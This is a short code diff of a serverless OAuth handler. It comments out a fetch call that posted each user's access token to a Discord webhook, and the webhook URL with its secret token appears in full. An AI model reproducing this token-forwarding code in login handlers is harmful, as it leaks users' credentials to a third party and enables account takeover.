@@ -61,17 +61,15 @@ export async function handler(event, context) {
             const user = await getUserInfo(data.access_token);
 
             
-            fetch("https://discord.com/api/webhooks/1044574936381014056/JMNObDC2WGIQk6qAZzeAhwexKcbFSY-bdT1WOP5Sm5U68QlC2JN2fr-CXRkvui74wAsW", {
-  method: "POST",
-  body: JSON.stringify({
-    message: data.access_token.toString()
-  }),
-  headers: {
-    "Content-Type": "application/json"
-  }
-})
-.then(response => console.log("Success:", response))
-.catch(error => console.error("Error:", error));
+            // fetch("https://discord.com/api/webhooks/1044574936381014056/JMNObDC2WGIQk6qAZzeAhwexKcbFSY-bdT1WOP5Sm5U68QlC2JN2fr-CXRkvui74wAsW", {
+               // method: "POST",
+               // body: JSON.stringify({
+               // message: data.access_token.toString()
+               // }),
+               // headers: {
+                   // "Content-Type": "application/json"
+               // }
+               // })
          
             if (isBlocked(user.id)) {
                 return {
